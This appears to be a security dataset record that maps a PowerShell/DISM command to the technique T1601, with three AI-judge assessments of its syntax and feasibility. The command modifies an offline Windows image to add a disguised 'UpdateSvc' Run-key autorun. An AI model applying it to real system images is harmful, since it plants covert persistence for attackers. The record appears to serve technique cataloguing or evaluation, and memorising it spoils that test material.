command: dism /Mount-Image /ImageFile:C:\images\install_clean.wim /Index:1 /MountDir:C:\Mount\Base; dism /Mount-Image /ImageFile:C:\images\install_mod.wim /Index:1 /MountDir:C:\Mount\Win; reg load HKLM\BASESOFT C:\Mount\Base\Windows\System32\Config\SOFTWARE >$null; reg load HKLM\OFFSOFT C:\Mount\Win\Windows\System32\Config\SOFTWARE >$null; New-Item -Path "Registry::HKEY_LOCAL_MACHINE\OFFSOFT\Microsoft\Windows\CurrentVersion\Run" -Force | Out-Null; New-ItemProperty -Path "Registry::HKEY_LOCAL_MACHINE\OFFSOFT\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateSvc" -Value "C:\Windows\System32\updater.ps1" -PropertyType String -Force | Out-Null; $b=(Get-ItemProperty "Registry::HKEY_LOCAL_MACHINE\BASESOFT\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue | Select-Object -ExcludeProperty PS* | Out-String).Trim().Split("`n"); $m=(Get-ItemProperty "Registry::HKEY_LOCAL_MACHINE\OFFSOFT\Microsoft\Windows\CurrentVersion\Run" -ErrorAction SilentlyContinue | Select-Object -ExcludeProperty PS* | Out-String).Trim().Split("`n"); Compare-Object $b $m
explanation: Modifies the offline image's Run key to establish startup execution and compares the registry values against a clean baseline using Compare-Object.
rationale_steps: Mount images and load offline SOFTWARE hives (Admin-only).
Create a new Run entry in the modified image.
Extract values from both hives and Compare-Object to confirm the added autorun.

llm_judgments.syntactic_justification: The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid DISM parameters, correct registry manipulation commands, and appropriate error handling.
llm_judgments.semantic_justification: The command precisely implements T1601 by mounting and modifying a Windows system image to add a persistence mechanism through the Run registry key, then comparing it against a clean baseline to verify the changes.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct syntax for DISM, REG, and PowerShell cmdlets, with balanced quotes, valid flags, and proper command separators.
llm_judgments.semantic_justification: While the command's actions perfectly align with T1601 (modifying an offline system image for persistence), it is operationally unfeasible as described because all core operations (dism /Mount-Image, reg load, New-Item/New-ItemProperty for HKLM) critically require Administrator privileges, not 'None' as stated.

llm_judgments.syntactic_justification: Well-formed PowerShell chain with balanced quotes and valid flags; minor issue is the dubious use of '>$null' redirection which may cause runtime errors though it parses.
llm_judgments.semantic_justification: It aligns with modifying an offline Windows image by adding a Run key, but requires admin privileges (not 'None') and omits reg unload and DISM unmount/commit steps, so changes may not persist.
